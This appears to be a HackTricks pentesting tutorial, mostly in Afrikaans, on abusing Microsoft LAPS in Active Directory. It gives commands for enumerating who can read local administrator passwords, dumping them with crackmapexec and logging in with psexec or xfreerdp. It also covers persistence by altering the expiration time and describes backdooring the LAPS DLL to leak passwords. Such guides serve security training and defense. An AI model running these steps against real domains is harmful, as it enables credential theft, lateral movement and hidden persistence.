# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basiese Inligting

Local Administrator Password Solution (LAPS) is 'n hulpmiddel wat gebruik word om 'n stelsel te bestuur waar **administrateur wagwoorde**, wat **uniek, ewekansig, en gereeld verander** word, toegepas word op domein-verbonden rekenaars. Hierdie wagwoorde word veilig binne Active Directory gestoor en is slegs toeganklik vir gebruikers wat toestemming ontvang het deur middel van Toegangsbeheerlijste (ACLs). Die sekuriteit van die wagwoord oordragte van die kliënt na die bediener word verseker deur die gebruik van **Kerberos weergawe 5** en **Advanced Encryption Standard (AES)**.

In die domein se rekenaarobjekte, lei die implementering van LAPS tot die toevoeging van twee nuwe eienskappe: **`ms-mcs-AdmPwd`** en **`ms-mcs-AdmPwdExpirationTime`**. Hierdie eienskappe stoor die **planktekst administrateur wagwoord** en **sy vervaldatum**, onderskeidelik.

### Kontroleer of geaktiveer
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Wagwoord Toegang

Jy kan die **rauwe LAPS beleid** aflaai van `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` en dan **`Parse-PolFile`** van die [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) pakket gebruik om hierdie lêer in 'n menslike leesbare formaat om te skakel.

Boonop kan die **natuurlike LAPS PowerShell cmdlets** gebruik word as hulle op 'n masjien geïnstalleer is waartoe ons toegang het:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** kan ook gebruik word om uit te vind **wie die wagwoord kan lees en dit te lees**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Die [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) fasiliteer die enumerasie van LAPS met verskeie funksies.\
Een is om **`ExtendedRights`** te parse vir **alle rekenaars met LAPS geaktiveer.** Dit sal **groepe** spesifiek **toegewy aan die lees van LAPS wagwoorde** toon, wat dikwels gebruikers in beskermde groepe is.\
'n **rekening** wat **'n rekenaar** aan 'n domein aangesluit het, ontvang `All Extended Rights` oor daardie gasheer, en hierdie reg gee die **rekening** die vermoë om **wagwoorde te lees**. Enumerasie kan 'n gebruikersrekening toon wat die LAPS wagwoord op 'n gasheer kan lees. Dit kan ons help om **spesifieke AD gebruikers** te teiken wat LAPS wagwoorde kan lees.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

As daar geen toegang tot 'n powershell is nie, kan jy hierdie voorreg op afstand misbruik deur LDAP deur te gebruik
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Dit sal al die wagwoorde wat die gebruiker kan lees, dump, wat jou toelaat om 'n beter voet aan die grond te kry met 'n ander gebruiker.

## ** Gebruik LAPS Wagwoord **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Volharding**

### **Vervaldatum**

Sodra jy admin is, is dit moontlik om die **wagwoorde** te **verkry** en 'n masjien te **verhoed** om sy **wagwoord** te **opdateer** deur die vervaldatum in die toekoms te **stel**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Die wagwoord sal steeds teruggestel word as 'n **admin** die **`Reset-AdmPwdPassword`** cmdlet gebruik; of as **Moet nie wagwoordvervaltyd langer as wat deur beleid vereis word toelaat nie** geaktiveer is in die LAPS GPO.

### Backdoor

Die oorspronklike bronkode vir LAPS kan [hier](https://github.com/GreyCorbel/admpwd) gevind word, daarom is dit moontlik om 'n backdoor in die kode te plaas (binne die `Get-AdmPwdPassword` metode in `Main/AdmPwd.PS/Main.cs` byvoorbeeld) wat op een of ander manier **nuwe wagwoorde sal uitbring of dit êrens sal stoor**.

Dan, compileer net die nuwe `AdmPwd.PS.dll` en laai dit op na die masjien in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (en verander die wysigingstyd).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)


{{#include ../../banners/hacktricks-training.md}}
